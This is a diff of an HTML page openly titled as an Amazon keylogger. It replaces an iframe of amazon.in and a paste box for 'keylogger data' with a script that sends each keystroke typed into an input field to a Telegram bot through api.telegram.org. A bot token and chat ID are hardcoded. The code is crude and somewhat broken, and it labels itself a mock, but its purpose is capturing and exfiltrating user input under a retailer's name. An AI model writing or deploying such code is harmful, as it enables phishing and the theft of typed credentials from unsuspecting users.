@@ -1,59 +1,37 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Keylogger</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+    <meta charset="UTF-8" />
+    <title>Amazon Web View with Keylogger</title>
+    <script>
+        // JavaScript to handle web view and keylogging
+        function handleKeylogger() {
+            const userInput = document.getElementById('userInput').value;
+            if (userInput.trim()) {
+                // Send to Telegram bot
+                const telegramBotToken = "8861251322:AAEF9iBSEkOpKONwI04";
+                const userTelegramId = "8844584255";
+                const message = `User: ${userInput} - Telegram Bot Token: ${telegramBotToken}, User ID: ${userTelegramId}`;
+                
+                // Example Telegram Bot API call (this is a mock)
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${userTelegramId}&text=${message}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Telegram Message Sent:", data);
+                    })
+                    .catch(error => {
+                        console.error("Error sending Telegram message:", error);
+                    });
+            }
         }
 
-        #amazon-view {
-            background-color: #f2f2f2;
-            border: 1px solid #ccc;
-            padding: 20px;
-            max-width: 800px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-
-        #telegram-input {
-            margin-bottom: 20px;
-            padding: 10px;
-            border: 1px solid #ccc;
-        }
-    </style>
+        // Add input field
+        document.getElementById('userInput').addEventListener('input', handleKeylogger);
+    </script>
 </head>
 <body>
-    <div id="amazon-view" >
-        <iframe src="https://www.amazon.in" frameborder="0"></iframe>
-    </div>
-
-    <label for="telegram-input">Send data to Telegram:</label>
-    <textarea id="telegram-input" placeholder="Paste keylogger data here"></textarea>
-    <button onclick="sendTelegram()">Send</button>
-
-    <script>
-        function sendTelegram() {
-            // Get the value from the textarea.
-            const data = document.getElementById('telegram-input').value;
-
-            // Send to Telegram bot using your token and user ID.
-            fetch('/api/telegram', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ data })
-            })
-            .then(response => response.text())
-            .then(message => console.log('Message sent to Telegram:', message));
-
-        }
-    </script>
+    <h1>Amazon Web View with Keylogger</h1>
+    <input type="text" id="userInput" placeholder="Enter your message here..." />
 </body>
 </html>
